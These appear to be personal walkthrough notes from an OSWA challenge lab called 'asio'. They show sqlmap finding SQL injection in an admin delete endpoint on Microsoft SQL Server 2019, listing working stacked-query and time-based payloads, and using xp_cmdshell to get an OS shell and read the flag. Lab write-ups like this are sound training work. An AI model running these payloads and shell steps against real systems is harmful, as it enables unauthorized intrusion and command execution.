logged in with admin `API key`, presented with some obvious `SQL`
![[Pasted image 20250102175550.png]]
deleting a `SUBSCRIPTION` from this section of messages shows a `POST` request where `SQL` could be taking place at `/admin/message/deletee?id=5`
![[Pasted image 20250102180037.png]]
the same thing occurs a bit lower on the page to `SUBSCRIPTIONS`
![[Pasted image 20250102180008.png]]
the only thing we know thus far is that we know that it is `Microsoft SQL` -sending to repeater to begin testing

saved as `post_req.txt`
```http
POST /admin/message/delete?id=5 HTTP/1.1
Host: asio
Content-Length: 0
Cache-Control: max-age=0
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
Origin: http://asio
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://asio/admin
Accept-Encoding: gzip, deflate, br
Cookie: JSESSIONID=3A100F8B5264D727C2A0C1E9000C9C3E
Connection: keep-alive
```
began `sqlmap`, got the backend `SQL` database as well as `payloads`
```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[02Jan2025 23:06:44]-[/home/â€¦/SUT/OSWA/challenge_labs/asio]                                                                                                         
â””â”€# sqlmap -r post_req.txt --batch --risk=1 --level=3            
[23:07:53] [INFO] checking if the injection point on GET parameter 'id' is a false positive
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 515 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: id=(SELECT (CASE WHEN (5130=5130) THEN 5 ELSE (SELECT 5817 UNION SELECT 8440) END))

    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries (comment)
    Payload: id=5;WAITFOR DELAY '0:0:5'--

    Type: time-based blind
    Title: Microsoft SQL Server/Sybase time-based blind (IF)
    Payload: id=5 WAITFOR DELAY '0:0:5'
---
[23:07:54] [INFO] testing Microsoft SQL Server
[23:07:54] [INFO] confirming Microsoft SQL Server
[23:07:55] [INFO] the back-end DBMS is Microsoft SQL Server
back-end DBMS: Microsoft SQL Server 2019
[23:07:55] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 486 times
[23:07:55] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/asio'
```
once we found it was exploitable went straight for the `os-shell` - and got the `flag`
```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[02Jan2025 23:21:21]-[/home/â€¦/SUT/OSWA/challenge_labs/asio]                                                                                                         
â””â”€# sqlmap -r post_req.txt --batch --risk=1 --level=3 --os-shell                                                                                                                                            
        ___                                                                                                                                                                           
       __H__                                                                                                                                                                          
 ___ ___[.]_____ ___ ___  {1.8.12.2#dev}                                                                                                                                               
|_ -| . [']     | .'| . |                                                                                                                                                              
|___|_  [)]_|_|_|__,|  _|                                                                                                                                                              
      |_|V...       |_|   https://sqlmap.org                                                                                                                                          
                                                                                                                                                                                                            
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:21:23 /2025-01-02/

[23:21:23] [INFO] parsing HTTP request from 'post_req.txt'
[23:21:24] [INFO] resuming back-end DBMS 'microsoft sql server' 
[23:21:24] [INFO] testing connection to the target URL
got a 302 redirect to 'http://asio/admin'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: id=(SELECT (CASE WHEN (5130=5130) THEN 5 ELSE (SELECT 5817 UNION SELECT 8440) END))

    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries (comment)
    Payload: id=5;WAITFOR DELAY '0:0:5'--

    Type: time-based blind
    Title: Microsoft SQL Server/Sybase time-based blind (IF)
    Payload: id=5 WAITFOR DELAY '0:0:5'
---
[23:21:24] [INFO] the back-end DBMS is Microsoft SQL Server
back-end DBMS: Microsoft SQL Server 2019
[23:21:24] [INFO] testing if current user is DBA
[23:21:24] [INFO] testing if xp_cmdshell extended procedure is usable
[23:21:24] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[23:21:28] [INFO] xp_cmdshell extended procedure is usable
[23:21:28] [INFO] going to use extended procedure 'xp_cmdshell' for operating system command execution
[23:21:28] [INFO] calling Windows OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> type proof.txt
do you want to retrieve the command standard output? [Y/n/a] Y
[23:21:35] [INFO] retrieved: 2
[23:21:36] [INFO] retrieved: 247bd0cfa717190240afcb22a71ada58
[23:21:58] [INFO] retrieved:  
command standard output: '247bd0cfa717190240afcb22a71ada58'
os-shell> 
```